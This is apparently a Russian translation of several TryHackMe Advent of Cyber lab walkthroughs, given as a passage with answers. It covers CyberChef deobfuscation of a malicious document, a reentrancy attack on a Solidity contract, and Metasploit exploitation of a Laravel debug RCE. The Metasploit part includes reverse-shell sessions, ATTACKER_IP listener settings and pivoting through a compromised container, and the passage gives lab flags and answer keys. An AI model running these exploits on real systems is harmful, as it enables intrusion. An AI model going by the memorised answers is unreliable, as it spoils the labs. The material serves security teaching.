Каково хеш-значение вложения?

```commandline
0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467
```
Посетите сайт Virus Total и используйте значение хэша для поиска.
Перейдите в раздел поведения.
Какая вторая тактика отмечена в разделе Mitre ATT&CK?

```commandline
Defense Evasion
```
Посетите сайт InQuest и используйте значение хэша для поиска.
Какова подкатегория файла?

```commandline
macro_hunter
```
Если вы хотите узнать больше о фишинге и анализе электронных писем, ознакомьтесь с  модулем «Фишинг»! 
```commandline
Ответ не нужен
```

## Задание 12
Посмотрите видеообзор SecurityNinja на 7-й день  здесь !

В предыдущей задаче мы узнали, что McSkidy действительно стал жертвой фишинговой кампании, которая также содержала 
подозрительно выглядящий документ Division_of_labour-Load_share_plan.doc. McSkidy случайно открыл документ, и до сих 
пор неизвестно, что этот документ делал на заднем плане. McSkidy вызвал внутреннего эксперта Forensic McBlue для 
проверки вредоносного документа и поиска доменов, на которые он перенаправляет. Вредоносные документы могут 
содержать подозрительную команду, которая должна быть выполнена при открытии, встроенное вредоносное ПО в качестве 
дроппера (компонент установщика вредоносного ПО) или могут иметь несколько доменов C2 для подключения.

### Цели обучения Cyberchef
- Что такое КиберШеф
- Каковы возможности CyberChef?
- Как использовать CyberChef для анализа вредоносного документа
- Как деобфусцировать, фильтровать и анализировать данные

### Развертывание лаборатории

Для сегодняшней задачи вам нужно будет развернуть машину, прикрепленную к этой задаче, нажав зеленую кнопку « 
Запустить машину », расположенную в правом верхнем углу этой задачи. Машина должна запуститься в режиме разделенного 
экрана. Если этого не произошло, вам нужно будет нажать синюю кнопку «Показать разделенный вид» в правом верхнем 
углу этой страницы.   

### Обзор CyberChef

CyberChef — это веб-приложение, используемое для нарезки, разрезания, кодирования, декодирования, разбора и анализа 
данных или файлов. Ниже описана схема CyberChef. Оффлайн-версия cyberChef добавлена в закладки в Firefox на машине, 
подключенной к этой задаче.  

Интерфейс CyberChef

Добавьте текст или файл на панель 1.
Панель 2 содержит различные функции, также известные как рецепты, которые мы используем для кодирования, 
декодирования, анализа, поиска или фильтрации данных. 
Перетащите функции или рецепты из панели 2 на панель 3, чтобы создать рецепт.
Результат выполнения рецептов показан на панели 4.
Нажмите «выпечка», чтобы запустить функции, добавленные на панели 3 по порядку. Мы можем выбрать «Автовыпечка», 
чтобы автоматически запускать рецепты по мере их добавления. 
Использование CyberChef для анализа вредоносных документов

Давайте используем функции, также известные как рецепты, из левой панели в CyberChef для анализа вредоносного 
документа. Каждый шаг поясняется ниже: 

1) Добавьте файл в CyberChef

Перетащите файл invoice.doc с рабочего стола на панель 1 в качестве входных данных, как показано ниже. В качестве 
альтернативы пользователь может добавить файл Division_of_labour-Load_share_plan.docс помощью значка Open file as 
input в правом верхнем углу страницы CyberChef.  

Показывает, как перетащить файл в CyberChef в качестве входных данных.

2) Извлечение строк

Строки — это последовательности символов ASCII и Unicode, которые можно печатать в файле. Нас интересуют строки, 
встроенные в файл, которые могут привести нас к подозрительным доменам. Используйте функцию stringsс левой панели, 
чтобы извлечь строки, перетащив ее на панель 3 и выбрав All printable chars , как показано ниже:  

Извлечение строк с помощью функции strings

Если мы рассмотрим результат, то увидим несколько случайных строк разной длины и несколько запутанных строк. Сузьте 
поиск, чтобы отобразить строки большей длины. Продолжайте увеличивать минимальную длину, пока не удалите весь шум и 
не останетесь только с осмысленной строкой, как показано ниже:  

Фильтрация строк по размеру с помощью функции strings

3) Удалить шаблон

Злоумышленники часто добавляют случайные символы, чтобы скрыть фактическое значение. Если мы проверим, то сможем 
найти некоторые повторяющиеся символы [ _ ]. Поскольку эти символы встречаются в разных местах, мы можем 
использовать regex (регулярные выражения) внутри Find / Replaceфункции, чтобы найти и удалить эти повторяющиеся 
символы.   

Чтобы использовать регулярное выражение, мы поместим символы в квадратные скобки [ ]и используем обратную косую 
черту \для экранирования символов. В этом случае окончательное регулярное выражение будет где представляет собой 
перевод строки , как показано ниже: [\[\]\n_]\n  

Используйте Regex в Find/Replace для фильтрации данных

Из результата видно, что мы имеем дело со скриптом PowerShell , и он использует строку в кодировке base64, чтобы 
скрыть реальный код. 

4) Отбрасывание байтов

Чтобы получить доступ к строке base64, нам нужно удалить лишние байты сверху. Давайте используем функцию Drop bytesи 
продолжим увеличивать число, пока верхние байты не будут удалены. 

Используйте функцию drop bytes для удаления нежелательных байтов.

5) Декодировать base64
Теперь у нас остался только текст base64. Мы будем использовать функцию From base64для декодирования этой строки, 
   как показано ниже: 

Использовать Base64 для декодирования текста из закодированного значения Base84

6) Декодировать UTF-16

Результат декодирования base64 явно указывает на скрипт PowerShell , что кажется интересным открытием. В целом, 
скрипты PowerShell используют Unicode UTF-16LEкодировку по умолчанию. Мы будем использовать Decode textфункцию для 
декодирования результата в UTF-16E, как показано ниже:  

Декодировать в UTF-16LE с помощью функции декодирования текста

7) Найдите и удалите общие закономерности

Forensic McBlue замечает различные повторяющиеся символы  ' ( ) + ' ` "в выходных данных, что делает результат 
немного запутанным. Давайте Find/Replaceснова используем regex в функции, чтобы удалить эти символы, как показано 
ниже. Окончательное regex будет ['()+'"`].  

Используйте регулярные выражения в функции «Найти/Заменить» для фильтрации данных

8) Найти и заменить

Если мы проверим вывод, то найдем различные домены и какие-то странные буквы ]b2H_перед каждой ссылкой на домен. 
Ниже также найдена функция замены, которая, кажется, заменяет это ]b2H_на http. 
Показывает использование функции «Найти/Заменить»

Давайте используем find / Replaceфункцию замены ]b2H_, как httpпоказано ниже:

Используйте функцию Replace/Replace для замены символов.

9) Извлечение URL-адресов

Результат ясно показывает некоторые домены, которые мы и ожидали найти. Мы воспользуемся функцией Extract URLsдля 
извлечения URL-адресов из результата, как показано ниже: 

Используйте функцию извлечения URL-адресов для извлечения URL-адресов из данных.

10) Разделение URL-адресов с помощью @

Результат показывает, что за каждым доменом следует символ @ , который можно удалить с помощью функции разделения, 
как показано ниже: 

Используйте функцию разделения для разделения строк

11) Определить URL-адрес

Отлично — мы наконец-то извлекли URL-адреса из вредоносного документа. Похоже, документ действительно был 
вредоносным и загружал вредоносную программу с подозрительного домена. 

Перед тем, как передать эти домены команде SOC для глубокого анализа вредоносного ПО, рекомендуется дефэнгить их, 
чтобы избежать случайных кликов. Дефэнгинг URL-адресов делает их некликабельными. Мы будем использовать Defang 
URLдля выполнения задачи, как показано ниже:  

Используйте Defang для очистки URL-адресов, чтобы сделать их некликабельными

Отличная работа! 

Пришло время поделиться URL-адресами и вредоносным документом с аналитиками вредоносного ПО.

### Ответить на вопросы ниже
Какая версия CyberChef обнаружена в прикрепленной виртуальной машине?

```commandline
9.49.0
```
Сколько рецептов было использовано для извлечения URL-адресов из вредоносного документа?


```commandline
10
```
Мы обнаружили URL-адрес, загружающий подозрительный файл. Как называется эта вредоносная программа?


```commandline
mysterygift.exe
```
Какой последний очищенный URL-адрес домена  bandityeti  был найден на последнем шаге?


```commandline
hxxps[://]cdn[.]bandityeti[.]THM/files/index/
```
Какой тикет найден в одном из доменов? (Формат: Домен/<GOLDEN_FLAG>)


```commandline
THM_MYSTERY_FLAG
```
Если вам понравилось сегодняшнее расследование, вам также может понравиться модуль «Информация о безопасности и 
управление событиями» !  
```commandline
Ответ не нужен
```

## Задание 13
После того, как было обнаружено, что Best Festival Company теперь находится на блокчейне и пытается чеканить свою 
криптовалюту, они были быстро скомпрометированы. Best Festival Company потеряла всю свою валюту на бирже из-за атаки.
Вам, как оператору красной команды, предстоит выяснить, как злоумышленник использовал контракт, и попытаться 
воссоздать атаку против того же целевого контракта.

### Цели обучения
- Объясните, что такое смарт-контракты, как они связаны с блокчейном и почему они важны.
- Понять, как связаны между собой контракты, на чем они построены и каковы стандартные основные функции.
- Изучите и используйте распространенную уязвимость смарт-контрактов.
- Что такое блокчейн?
Одной из последних инновационных и обсуждаемых технологий является блокчейн и его влияние на современные вычисления. 
  Хотя исторически он использовался как финансовая технология, в последнее время он распространился на многие другие 
  отрасли и приложения. Неформально блокчейн действует как база данных для хранения информации в определенном 
  формате и совместно используется членами сети без какого-либо контроля со стороны какой-либо одной организации.   

По определению, блокчейн — это цифровая база данных или реестр, распределенный между узлами одноранговой сети. 
Блокчейн распределен между «пирами» или участниками без центральных серверов, поэтому он «децентрализован». В связи 
с его децентрализованной природой каждый пир должен поддерживать целостность блокчейна. Если один из участников сети 
попытается злонамеренно изменить блокчейн, другие участники сравнят его со своим блокчейном на предмет целостности и 
определят, должна ли вся сеть отражать это изменение.    

Основная технология блокчейна направлена на децентрализацию и сохранение целостности; для согласования транзакций 
и обеспечения полезности блокчейна используется криптография.  

Но что это означает для безопасности? Если мы проигнорируем саму основную технологию блокчейна, которая опирается на 
криптографию, и вместо этого сосредоточимся на том, как данные передаются и согласовываются, мы можем найти ответ, 
который вызывает беспокойство. В ходе выполнения этой задачи мы продолжим исследовать безопасность того, как 
информация передается через блокчейн, и рассмотрим реальные примеры практического применения блокчейна.   

### Введение в смарт-контракты
Большинство практических приложений блокчейна основаны на технологии, известной как смарт-контракт. Смарт-контракты 
чаще всего используются в качестве основы приложений DeFi (децентрализованных финансовых приложений) для поддержки 
криптовалюты на блокчейне. Приложения DeFi облегчают обмен валютами между субъектами; смарт-контракт определяет 
детали обмена. Смарт-контракт — это программа, хранящаяся на блокчейне, которая запускается при выполнении заранее 
определенных условий.    

Смарт-контракты очень похожи на любую другую программу, созданную на языке сценариев. Несколько языков, таких как 
Solidity, Vyper и Yul, были разработаны для облегчения создания контрактов. Смарт-контракты можно разрабатывать даже 
с использованием традиционных языков программирования, таких как Rust и JavaScript; по своей сути смарт-контракты 
ждут условий и выполняют действия, аналогичные традиционной логике.   

### Функциональность смарт-контракта
Создание смарт-контракта может показаться пугающим, но это сильно контрастирует с основными концепциями 
объектно-ориентированного программирования. 

Прежде чем углубляться в функциональность контракта, давайте представим, что контракт — это класс. В зависимости от 
полей или информации, хранящейся в классе, вы можете захотеть, чтобы отдельные поля были закрытыми, предотвращая 
доступ или изменение, если не выполнены условия. Поля или информация смарт-контракта должны быть закрытыми и 
доступными или измененными только из функций, определенных в контракте. Контракт обычно имеет несколько функций, 
которые действуют аналогично аксессорам и мутаторам, например, проверка баланса, внесение и снятие валюты.    

После того, как контракт развернут в блокчейне, другой контракт может использовать его функции для вызова или 
выполнения функций, которые мы только что определили выше. 

Если бы мы контролировали Контракт A, а Контракт B хотел бы сначала внести 1 Ethereum, а затем вывести 1 Ethereum из 
Контракта A, 

Контракт B вызывает функцию депозита контракта A.

Контракт А разрешает внесение депозита после проверки необходимости соблюдения каких-либо заранее определенных условий.



Контракт B вызывает функцию снятия средств контракта A.

Контракт А разрешает внесение депозита при соблюдении заранее определенных условий вывода средств.



Контракт B может выполнять другие функции после отправки эфира из контракта A, но до разрешения функции.



### Как возникают уязвимости в смарт-контрактах?
Большинство уязвимостей смарт-контрактов возникают из-за проблем с логикой или плохой обработки исключений. 
Большинство уязвимостей возникают в функциях, когда условия небезопасно реализованы через ранее упомянутые проблемы. 

Давайте вернемся к контракту A из предыдущего раздела. Условия функции снятия следующие:

- Баланс больше нуля
- Отправить Эфириум
На первый взгляд, это может показаться нормальным, но когда отправляемая сумма вычитается из баланса? Возвращаясь к 
  схеме контракта, она вычитается из баланса только после отправки Ethereum. Является ли это проблемой? Функция 
  должна завершиться до того, как контракт сможет обработать любые другие функции. Но если вы помните, контракт 
  может последовательно выполнять новые вызовы функции, пока старая функция все еще выполняется. Злоумышленник может 
  непрерывно пытаться вызвать функцию снятия средств, прежде чем он сможет очистить баланс; это означает, что 
  предопределенные условия всегда будут выполняться. Разработчик должен изменить логику функции, чтобы удалить 
  баланс, прежде чем можно будет сделать другой вызов или потребовать выполнения более строгих требований.      

### Атака повторного входа
В разделе выше мы неформально представили распространенную уязвимость, известную как повторный вход. Повторяя то, 
что было рассмотрено выше, повторный вход происходит, когда вредоносный контракт использует функцию отката, чтобы 
продолжить опустошение общего баланса контракта из-за ошибочной логики после того, как происходит начальная функция 
снятия.   

Чтобы лучше объяснить атаку, мы разбили ее на диаграммы, похожие на те, что были представлены ранее.

Предположим, что контракт B является атакующим контрактом, а контракт A — контрактом хранения. Контракт B выполнит 
функцию для внесения, а затем снятия по крайней мере одного Ether. Этот процесс необходим для инициирования ответа 
функции снятия.  



Обратите внимание на разницу между балансом счета и общим балансом на диаграмме выше. Контракт на хранение разделяет 
балансы по счетам и сохраняет общий баланс каждого счета объединенным. Мы специально нацеливаемся на общий баланс, 
которым мы не владеем, чтобы эксплуатировать контракт.  



На этом этапе контракт B может либо отбросить ответ от функции изъятия, либо вызвать функцию отката. Функция отката 
— это зарезервированная функция в Solidity, которая может появляться один раз в одном контракте. Функция выполняется,
когда валюта отправляется без другого контекста или данных, например, что происходит в этом примере. Функция отката 
снова вызывает функцию изъятия, в то время как исходный вызов функции никогда не был полностью разрешен. Помните, 
что баланс никогда не обнуляется, и контракт считает Ether своим общим балансом при отправке, не разделенным на 
каждый счет, поэтому он продолжит отправлять валюту сверх баланса счета, пока общий баланс не станет нулевым.     



Поскольку функция снятия средств отправляет Ether без контекста или данных, резервная функция будет вызвана снова, и,
таким образом, теперь может возникнуть бесконечный цикл. 

Теперь, когда мы рассмотрели, как возникает эта уязвимость и как мы можем ее эксплуатировать, давайте проверим ее! 
Мы предоставили вам контракт, развернутый Best Festival Company в безопасной и контролируемой среде, которая 
позволяет вам развертывать контракты так, как если бы они были в публичном блокчейне.  

### Практическое применение
Мы охватили почти всю необходимую справочную информацию, чтобы взяться за дело; давайте попробуем свои силы в 
активном использовании контракта, подверженного уязвимости повторного входа. Для этой задачи мы будем использовать 
Remix IDE , которая предлагает безопасную и контролируемую среду для тестирования и развертывания контрактов, как 
если бы они находились на публичном блокчейне.   

Мы предоставили вам два файла: один из них получен от компании Best Festival Company, используемой для размещения 
своего криптовалютного баланса, и другой вредоносный контракт, который попытается использовать уязвимость повторного 
входа.  

Оба контракта являются законными контрактами Solidity, но не стоит беспокоиться, если вы не понимаете синтаксис 
программы, стоящий за каждым из них. Они следуют той же функциональности и методологии, которую мы рассмотрели в 
этой задаче, просто переведенной в код!  

Знакомство со средой ремиксов

Когда вы впервые открываете remix, вы хотите обратить внимание на левую сторону; там будут файловый проводник, поиск,
компилятор Solidity и кнопка навигации по развертыванию, соответственно, сверху вниз. Мы проведем большую часть 
времени в меню развертывания и запуска транзакций, поскольку оно позволяет нам выбирать среду, учетную запись и 
контракт и взаимодействовать с контрактами, которые мы скомпилировали.   

Импорт необходимых контрактов

Чтобы начать работу с задачей, вам нужно будет импортировать предоставленные вам файлы задач. Для этого перейдите в  
проводник файлов → default_workspace → загрузить локальный файл в текущую рабочую область . Отсюда вы можете выбрать 
необходимые .solфайлы для импорта. Мы предоставили вам файл EtherStore.solи Attack.sol, который функционирует так, 
как мы представили в этом разделе.   

Составление контрактов

Скриншот меню развертывания и запуска транзакций Remix IDE
Следующий шаг — компиляция контрактов; каждый должен быть скомпилирован индивидуально перед развертыванием. Чтобы 
скомпилировать контракт, 

Откройте контракт в основном текстовом редакторе Remix — это позволит Remix узнать, какой контракт вы хотите 
скомпилировать. 
Перейдите к  компилятору Solidity и выберите его 0.8.10+commitfcxxxxxx из раскрывающегося меню компилятора.
Скомпилируйте контракт, нажав  кнопку компиляции. Вы можете игнорировать любые предупреждения, которые могут 
возникнуть при компиляции. 
Развертывание и взаимодействие с контрактами

Теперь, когда у нас есть скомпилированные контракты, они готовы к развертыванию из вкладки развертывания. Справа 
находится скриншот вкладки развертывания и метки, которые мы будем использовать для ссылки на элементы меню по мере 
продвижения по процессу развертывания.  

Сначала мы должны выбрать контракт для развертывания из  раскрывающегося списка контрактов ( метка 6 ). Для начала 
нам следует развернуть контракт EtherStore или целевой контракт. Для развертывания вам нужно только нажать  кнопку 
развертывания ( метка 7).  

Теперь мы можем взаимодействовать с контрактом в  подразделе развернутых контрактов . Чтобы протестировать контракт, 
мы можем внести Ether в контракт, который будет добавлен к общему балансу. Чтобы внести депозит, введите значение в  
текстовое поле значения ( метка 4 ) и выберите номинал валюты в раскрывающемся списке под  меткой 5. После 
завершения настройки вы можете внести депозит, нажав кнопку внесения депозита ( метка 10 ).   

Примечание: при нажатии кнопки внесения депозита мы вызываем публичную функцию, как если бы это был другой контракт, 
вызывающий функцию извне. 

Мы успешно развернули наш первый контракт и использовали его! Вы должны увидеть  обновление баланса ( метка 9 ).

Теперь, когда мы развернули наш первый контракт, переключитесь на другую учетную запись (раскрывающийся  список 2 и 
выберите новую учетную запись) и повторите тот же процесс. На этот раз вы будете эксплуатировать исходный контракт и 
должны увидеть, как эксплойт активно происходит! Ниже мы привели сводку шагов по развертыванию и взаимодействию с 
контрактом.   

Шаг 1: Выберите контракт, который вы хотите развернуть, из раскрывающегося меню контрактов под меткой 6.

Шаг 2: Разверните контракт, нажав кнопку «Развернуть».

Примечание: вам необходимо предоставить ссылку на целевой контракт перед развертыванием контракта атаки. Для этого 
скопируйте адрес EtherStore  с помощью кнопки справа от  метки 11 и вставьте значение в текстовое поле под меткой 8 . 

Шаг 3: Убедитесь, что контракт был развернут, а функция атаки отображается в подразделе развернутых контрактов .

Шаг 4: Выполнение и/или взаимодействие с функцией контракта; обратите внимание, что для правильного выполнения 
функции большинству функций требуется некоторая форма входного значения. 

Примечание: При вводе суммы эфира используйте небольшие числа, например, 2–4. Remix использует ресурсы 
хост-устройства, а атака основана на рекурсии, которая, как известно, удерживает ресурсы и приводит к сбоям приложения. 

Если вы застряли, перечитайте открытие и объяснение уязвимости повторного входа. Помните, что сначала нужно внести и 
снять деньги, прежде чем функция отката сможет сработать. 

### Ответить на вопросы ниже
Если вы еще не сделали этого, загрузите zip-архив, прикрепленный к этой задаче, и откройте Remix в предпочитаемом 
вами браузере. 
```commandline
Ответ не нужен
```
Какой флаг обнаруживается после атаки на предоставленный контракт EtherStore?

flag{411_ur_37h_15_m1n3}
```commandline
Ответ не нужен
```
Вы готовы к небольшому испытанию, чтобы отпраздновать 8-й день? Попробуйте свои силы в этих простых комнатах 
испытаний: Quotient и Agent T !  
```commandline
Ответ не нужен
```

## Задание 14
Сегодняшнее задание было создано командой Metasploit Team в Rapid7.

Из-за недавнего инцидента Санта попросил свою команду создать новое веб-приложение, работающее на Docker. Оно должно 
быть намного безопаснее предыдущего, но лучше перестраховаться, чем потом сожалеть, верно? Тебе, МакСкиди, нужно 
показать Санте, что могут быть скрытые уязвимости, прежде чем их найдут плохие парни!  

Примечание перед тем, как начать
Привет,

Эта задача немного сложнее, чем то, что вы видели до сих пор в этом событии. Мы позаботились о том, чтобы в 
содержании задачи была вся необходимая вам информация. Однако, поскольку для ее выполнения требуется много подвижных 
частей, это может оказаться сложным. Не беспокойтесь! У нас достаточно ресурсов, чтобы вам помочь.  

Ссылка выше — видео-прохождение испытания, записанное Alh4zr3d. Оно включает в себя подробное объяснение, 
исчерпывающую инструкцию, ценные подсказки, аналогии и полное руководство по ответам на все вопросы. Используйте его! 

Если вам нужно больше, посетите нас на Discord ! У нас есть специальный канал для Advent of Cyber, с дежурным 
персоналом и очень поддерживающим сообществом, которое поможет вам со всеми вашими вопросами и сомнениями. 

У тебя все получится! Увидимся завтра — Эльфу МакСкиди понадобится твоя помощь больше, чем когда-либо.

С любовью,

Команда TryHackMe

### Цели обучения
- Использование модулей Metasploit и Meterpreter для взлома систем
- Сетевой поворот
- Пост эксплуатация

### Концепции
#### Что такое Докер?
Docker — это способ упаковки приложений и связанных с ними зависимостей в единый блок, называемый образом. Затем 
этот образ можно использовать совместно и запускать как контейнер, как локально в качестве разработчика, так и 
удаленно на производственном сервере. Веб-приложение и база данных Санты работают в контейнерах Docker, но только 
веб-приложение напрямую доступно через открытый порт. Обычный способ узнать, работает ли скомпрометированное 
приложение в контейнере Docker, — проверить наличие файла /.dockerenvв корневом каталоге файловой системы.    

### Что такое Metasploit ?
Metasploit — это мощный инструмент для тестирования на проникновение, позволяющий получить начальный доступ к 
системам, выполнить последующую эксплуатацию и перейти на другие приложения и системы. Metasploit — это бесплатное 
программное обеспечение с открытым исходным кодом, принадлежащее американской компании по кибербезопасности Rapid7.   

### Что такое сессия Metasploit ?
После успешной эксплуатации удаленной цели с помощью модуля Metasploit сеанс часто открывается по умолчанию. Эти 
сеансы часто являются сеансами Command Shells или Meterpreter, которые позволяют выполнять команды против цели. 
Также в Metasploit можно открывать другие типы сеансов, такие как SSH или WinRM, которые не требуют полезных 
нагрузок.   

Общие команды консоли Metasploit для просмотра и управления сеансами в Metasploit :

Метасплоит Консольные команды
```commandline
# view sessions
sessions

# upgrade the last opened session to Meterpreter
sessions -u -1

# interact with a session
sessions -i session_id

# Background the currently interactive session, and go back to the Metasploit prompt
background
```

### Что такое Meterpreter ?
Meterpreter — это усовершенствованная полезная нагрузка, которая обеспечивает интерактивный доступ к 
скомпрометированной системе. Meterpreter поддерживает запуск команд на удаленной цели, включая загрузку/скачивание 
файлов и поворот.

Meterpreter имеет множество полезных команд, например следующие:

Meterpreter Команды
```commandline
# Get information about the remote system, such as OS
sysinfo

# Upload a file or directory
upload local_file.txt

# Display interfaces
ipconfig

# Resolve a set of host names on the target to IP addresses - useful for pivoting
resolve remote_service1 remote_service2
```

Обратите внимание, что обычные командные оболочки не поддерживают сложные операции, такие как поворот. В консоли 
Metasploit вы можете обновить последний открытый сеанс Metasploit до сеанса Meterpreter с помощью sessions -u -1.

Вы можете определить открытые типы сеансов с помощью sessionsкоманды. Если вы в данный момент взаимодействуете с 
сеансом Meterpreter , вы должны сначала backgroundего. В приведенном ниже примере два типа сеансов — shell cmd/unixи 
meterpreter x86/linux:  

Meterpreter Команды
```commandline
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                        Connection
  --  ----  ----                   -----------                                        ----------
  4         shell cmd/unix                                                            10.11.8.17:4444 -> 10.10.152.194:44124 (10.10.152.194)
  5         meterpreter x86/linux  www-data @ 172.28.101.50                           10.11.8.17:4433 -> 10.10.152.194:33296 (172.28.101.50)
```
       
### Что такое поворот?
После того, как злоумышленник получит первичный доступ к системе, взломанная машина может быть использована для 
отправки дополнительного веб-трафика, что позволит получить доступ к ранее недоступным машинам. 

Например, начальный плацдарм может быть получен через веб-приложение, работающее в контейнере Docker, или через 
открытый порт на машине Windows. Эта система станет стартовой площадкой для атак на другие системы в сети. 

Изображение первоначального плацдарма между хостом пентестера и скомпрометированным контейнером

Мы можем направить сетевой трафик через эту скомпрометированную машину для запуска инструментов сканирования сети, 
таких как nmapили arpдля поиска дополнительных машин и служб, которые ранее были недоступны для пентестера. Эта 
концепция называется сетевым поворотом.  

Изображение перехода с использованием скомпрометированного контейнера на другие конечные точки в сети


### Запуск TryHackMe Kali Linux
Для этой задачи вам необходимо использовать машину Kali. TryHackMe host и предоставить версию Kali Linux, которой 
можно управлять в вашем браузере. Вы также можете подключиться к своей собственной Kali Linux с помощью OpenVPN. Tha 
Kali VM доступна только подписчикам - если вы не являетесь подписчиком, вы можете выполнить эту задачу с помощью 
OpenVPN.    

Вы можете развернуть машину TryHackMe Kali, выполнив следующие шаги:
1. Прокрутите страницу вверх и нажмите стрелку раскрывающегося списка справа от синей кнопки «Запустить AttackBox»:
изображение, иллюстрирующее расположение кнопки запуска виртуальной машины Kali

2. Выберите «Использовать Kali Linux» из раскрывающегося списка:
изображение, иллюстрирующее кнопки запуска Kali VM и AttackBox

3. Теперь нажмите кнопку «Запустить Kali», чтобы развернуть машину:
изображение, иллюстрирующее кнопку запуска Kali VM

4. Машина откроется в режиме разделенного экрана:
изображение, иллюстрирующее виртуальную машину Kali в режиме разделенного экрана


### Использование Metasploit
Если вы используете веб-машину Kali или свою собственную машину Kali, вы можете открыть Metasploit с помощью следующей msfconsoleкоманды:

Команды оболочки
```commandline
$ msfconsole
Metasploit Framework console...
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=           | |  EXPLOIT               |
  |            // \          | |____________________    |
  |           //   \         | |==[msf >]============   |
  |          //     \        | |______________________  |
  |         // RECON \       | (@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        '///'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__          |
  | |    PAYLOAD     |""___, |     /    (_||_           |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.2.27-dev-4c958546b5               ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with advanced
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

После открытия msfconsole доступно несколько команд:

Метасплоит Консольные команды
```commandline
# To search for a module, use the ‘search’ command:
msf6 > search laravel

# Load a module with the ‘use’ command
msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```

После использования модуля Metasploit вы можете просмотреть параметры, задать параметры и запустить модуль:

Метасплоит Консольные команды
```commandline
# View the available options to set
show options

# Set the target host and logging
set rhost MACHINE_IP
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run
```

Вы также можете напрямую задать параметры из run команды:

Метасплоит Консольные команды
```commandline
msf6 > use admin/postgres/postgres_sql
msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://user:password@MACHINE_IP/database_name sql='select version()'
[*] Running module against 172.28.101.51

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 10.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 6.4.0) 6.4.0, 64-bit

[*] Auxiliary module execution completed
```

### Использование Meterpreter для поворота
Metasploit имеет внутреннюю таблицу маршрутизации, которую можно изменить с помощью route команды. Эта таблица 
маршрутизации определяет, куда направлять сетевой трафик, например, через сеанс Meterpreter . Таким образом, мы 
используем Meterpreter для поворота: отправки трафика на другие машины в сети.  

Обратите внимание, что Meterpreter имеет отдельную команду route, которая не совпадает с командой route приглашения 
Metasploit верхнего уровня, описанной ниже. Если вы в данный момент взаимодействуете с сеансом Meterpreter , вы 
должны сначала backgroundее.  

Примеры:

Метасплоит Консольные команды
```commandline
# Example usage
route [add/remove] subnet netmask [comm/sid]

# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
route add 172.17.0.1/32 -1

# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
route add 172.28.10.48/29 -1

# Output the routing table
route print
```

### Прокси-сервер Socks
Прокси-сервер socks — это промежуточный сервер, который поддерживает ретрансляцию сетевого трафика между двумя 
машинами. Этот инструмент позволяет реализовать технику поворота. Вы можете запустить прокси-сервер socks либо 
локально на машине пентестера через Metasploit, либо непосредственно на скомпрометированном сервере. В Metasploit 
это можно сделать с помощью auxiliary/server/socks_proxyмодуля:

Метасплоит Консольные команды
```commandline
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
```

Такие инструменты, как curl поддержка отправки запросов через прокси-сервер Socks с помощью --proxy флага:

Команды оболочки
```commandline
curl --proxy socks4a://localhost:9050 http://MACHINE_IP
```

Если инструмент изначально не поддерживает опцию использования socks-прокси, ProxyChains может перехватить запрос 
инструмента на открытие новых сетевых подключений и вместо этого направить запрос через socks-прокси. Например, 
пример с Nmap:

Команды оболочки
```commandline
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP
```

### Прохождение задания
После развертывания подключенной виртуальной машины запустите Nmap для целевой машины:

Команды оболочки
```commandline
nmap -T4 -A -Pn MACHINE_IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 10:30 EDT
Nmap scan report for 10.10.173.133
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

После загрузки веб-приложения в нашем браузере по адресу http://MACHINE_IP:80 (используйте Firefox на Kali 
web-Machine) и проверки вкладки «Сеть» мы видим, что сервер отвечает заголовком HTTP Set-Cookie, указывающим на то, 
что на сервере запущен Laravel — распространенный фреймворк для разработки веб-приложений:  

Изображение обнаруженного веб-приложения. Сетевые инструменты разработчика браузера открыты, и HTTP-заголовок 
'Set-Cookie: laravel_session' выделен 

Приложение может быть уязвимо к эксплойту удаленного выполнения кода, который влияет на приложения Laravel, 
использующие режим отладки в версиях Laravel до 8.4.2, которые используют ignite в качестве зависимости разработчика.  

Мы можем использовать Metasploit , чтобы проверить, уязвимо ли приложение для этого эксплойта.

Примечание: обязательно установите HttpClientTimeout=20, иначе проверка может не пройти. В экстремальных ситуациях, 
когда ваше соединение действительно медленное/нестабильное, вам может понадобиться значение выше 20 секунд. 

Команды оболочки
```commandline
$ msfconsole
msf6 > use multi/php/ignition_laravel_debug_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=MACHINE_IP HttpClientTimeout=20

[*] Checking component version to 10.10.143.36:80
[*] 10.10.143.36:80 - The target appears to be vulnerable.
```

Примечание: при использовании Kali Web-Machine от TryHackMe в качестве значения LHOST (ATTACKER_IP) следует 
